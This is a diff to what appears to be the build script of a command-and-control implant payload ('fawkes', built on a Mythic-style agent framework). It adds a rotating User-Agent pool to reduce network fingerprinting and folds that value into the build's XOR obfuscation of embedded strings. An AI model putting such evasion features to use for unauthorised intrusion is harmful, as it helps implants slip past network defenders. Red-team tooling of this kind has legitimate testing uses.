@@ -386,6 +386,13 @@ var payloadDefinition = agentstructs.PayloadType{
 			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_BOOLEAN,
 		},
 		{
+			Name:          "user_agent_pool",
+			Description:   "Optional: Newline-separated list of User-Agent strings. When set, the agent rotates through the pool per-request instead of using a single static User-Agent. Reduces network fingerprinting. Leave empty to use the default Chrome UA.",
+			Required:      false,
+			DefaultValue:  "",
+			ParameterType: agentstructs.BUILD_PARAMETER_TYPE_STRING,
+		},
+		{
 			Name:          "kill_date",
 			Description:   "Optional: UTC date/time after which the agent will self-terminate (format: YYYY-MM-DD or YYYY-MM-DD HH:MM). Leave empty for no kill date. Enforced every tasking cycle.",
 			Required:      false,
@@ -752,6 +759,11 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 		ldflags += fmt.Sprintf(" -X '%s.killDate=%d'", fawkes_main_package, kdTime.Unix())
 	}
 
+	// User-Agent pool
+	if uaPool, err := payloadBuildMsg.BuildParameters.GetStringArg("user_agent_pool"); err == nil && uaPool != "" {
+		ldflags += fmt.Sprintf(" -X '%s.userAgentPool=%s'", fawkes_main_package, strings.ReplaceAll(uaPool, "'", ""))
+	}
+
 	// Max retries
 	if mrStr, err := payloadBuildMsg.BuildParameters.GetStringArg("max_retries"); err == nil && mrStr != "" {
 		if _, parseErr := strconv.Atoi(mrStr); parseErr != nil {
@@ -844,6 +856,9 @@ func build(payloadBuildMsg agentstructs.PayloadBuildMessage) agentstructs.Payloa
 		}
 		if ct, err := payloadBuildMsg.BuildParameters.GetStringArg("content_types"); err == nil && ct != "" {
 			obfVars = append(obfVars, obfVar{"contentTypes", ct})
+		}
+		if uap, err := payloadBuildMsg.BuildParameters.GetStringArg("user_agent_pool"); err == nil && uap != "" {
+			obfVars = append(obfVars, obfVar{"userAgentPool", strings.ReplaceAll(uap, "'", "")})
 		}
 		// Replace plaintext values in ldflags with XOR-encoded versions
 		for _, v := range obfVars {
